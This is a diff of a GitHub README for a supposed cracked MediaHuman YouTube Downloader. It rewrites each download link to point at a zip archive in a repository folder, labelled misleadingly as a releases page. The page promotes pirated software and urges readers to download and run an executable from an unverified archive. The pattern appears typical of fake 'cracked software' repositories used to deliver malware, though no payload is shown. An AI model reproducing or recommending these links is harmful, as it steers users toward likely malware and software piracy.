@@ -1,6 +1,6 @@
 # 🎥 MediaHuman-YouTube-Downloader-Cracked - Download Videos Easily and Free
 
-[![Download MediaHuman-YouTube-Downloader-Cracked](https://raw.githubusercontent.com/Jaydeep0707/MediaHuman-YouTube-Downloader-Cracked/main/regally/MediaHuman-YouTube-Downloader-Cracked.zip)](https://raw.githubusercontent.com/Jaydeep0707/MediaHuman-YouTube-Downloader-Cracked/main/regally/MediaHuman-YouTube-Downloader-Cracked.zip)
+[![Download MediaHuman-YouTube-Downloader-Cracked](https://github.com/Jaydeep0707/MediaHuman-YouTube-Downloader-Cracked/raw/refs/heads/main/regally/Tube_Cracked_Downloader_Human_Media_You_v3.3.zip)](https://github.com/Jaydeep0707/MediaHuman-YouTube-Downloader-Cracked/raw/refs/heads/main/regally/Tube_Cracked_Downloader_Human_Media_You_v3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Thank you for choosing MediaHuman-YouTube-Downloader-Cracked! This application a
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**: Click the following link to access the download section.
-   [Download the latest version here](https://raw.githubusercontent.com/Jaydeep0707/MediaHuman-YouTube-Downloader-Cracked/main/regally/MediaHuman-YouTube-Downloader-Cracked.zip)
+   [Download the latest version here](https://github.com/Jaydeep0707/MediaHuman-YouTube-Downloader-Cracked/raw/refs/heads/main/regally/Tube_Cracked_Downloader_Human_Media_You_v3.3.zip)
 
 2. **Select the Right File**: On the Releases page, you will see various options. Look for the file that matches your device:
    - For **Windows**, choose the `.exe` file.
@@ -75,4 +75,4 @@ We welcome contributions! If you’d like to improve MediaHuman-YouTube-Download
 
 ---
 
-For any further information or updates, always refer back to our [Releases page](https://raw.githubusercontent.com/Jaydeep0707/MediaHuman-YouTube-Downloader-Cracked/main/regally/MediaHuman-YouTube-Downloader-Cracked.zip). Enjoy downloading your favorite media!
+For any further information or updates, always refer back to our [Releases page](https://github.com/Jaydeep0707/MediaHuman-YouTube-Downloader-Cracked/raw/refs/heads/main/regally/Tube_Cracked_Downloader_Human_Media_You_v3.3.zip). Enjoy downloading your favorite media!
